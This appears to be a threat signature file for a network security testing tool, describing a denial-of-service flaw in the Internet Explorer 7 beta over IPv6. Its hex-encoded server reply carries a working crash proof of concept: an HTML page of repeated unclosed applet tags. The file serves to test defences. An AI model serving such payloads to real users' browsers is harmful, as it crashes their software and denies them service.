@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Internet Explorer 7 Denial of Service Vulnerability (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat uses a malicious HTTP server reply to cause a denial-of-service  condition in a MSIE 7 beta client . Microsoft Internet Explorer 7 is a web browser that typically connects to a web server listening on port 80. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft"/>
+      <item value="Internet_Explorer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft"/>
+      <item value="Internet_Explorer_7.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://seclists.org/lists/bugtraq/2006/Jun/0743.html"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="18736"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="538d60b4b290196c9fc221d01eea38d8" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1219869387"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1152590909" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F696E6465782E68746D6C20485454502F312E310D0A486F73743A207777772E6576696C736974652E636F6D0D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520372E3020426574613B2057696E646F7773204E5420352E313B205356313B202E4E4554290D0A4163636570743A20746578742F786D6C2C6170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C203330204A756E20323030362031393A32313A303820474D540D0A5365727665723A204170616368650D0A4C6173742D4D6F6469666965643A204672692C203330204A756E20323030362031393A31383A333720474D540D0A455461673A20223365316539372D3162322D6561353639643430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203433340D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A2A0D0A2A204D73696520372E302042657461206372617368205B50726F6F66206F6620636F6E636570745D0D0A2A2042756720646973636F7665726564206279204D722E4E696567610D0A2A20687474703A2F2F7777772E7377657261742E636F6D2F0D0A2A0D0A2A20416666656374656420536F6674776172653A20496E7465726E6574204578706C6F72657220372E3020426574610D0A2A2053657665726974793A20556E6B6E6F776E0D0A2A20496D706163743A2043726173680D0A2A20536F6C7574696F6E205374617475733A20556E706174636865640D0A2A4372656469747320676F6573206F757420746F204D61726A696E5A0D0A2A2F0D0A0D0A3C68746D6C3E0D0A20203C626F64793E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C6170706C65743E0D0A20203C2F626F64793E0D0A203C2F68746D6C3E0D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
